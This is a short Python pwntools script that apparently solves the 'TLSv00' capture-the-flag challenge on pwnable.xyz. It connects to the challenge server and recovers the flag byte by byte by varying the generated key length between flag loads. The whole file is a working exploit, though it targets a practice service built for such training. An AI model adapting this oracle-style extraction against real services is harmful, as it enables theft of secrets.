from pwn import *

#context.log_level = 'debug'


def generateKey(len):
	p.recvuntil("> ")
	p.sendline('1')

	p.recvuntil("key len: ")
	p.sendline(str(len))


def loadFlag():
	p.recvuntil("> ")
	p.sendline('2')


def printFlag(answer):
	p.recvuntil("> ")
	p.sendline('3')

	p.recvuntil("Wanna take a survey instead? ")
	p.sendline(answer)



# p = process("./TLSv00")
p = remote("svc.pwnable.xyz", 30006)

printFlag('y')
generateKey(64)



flag_str = ""

for index in range(0,64) :
	generateKey(index+1)
	loadFlag()
	printFlag('n')

	flag_byte = p.recv(index+2)[index+1]


	flag_str += flag_byte
	
	print("[" + str(index) + "] " + flag_str)


print("[*] " + flag_str)
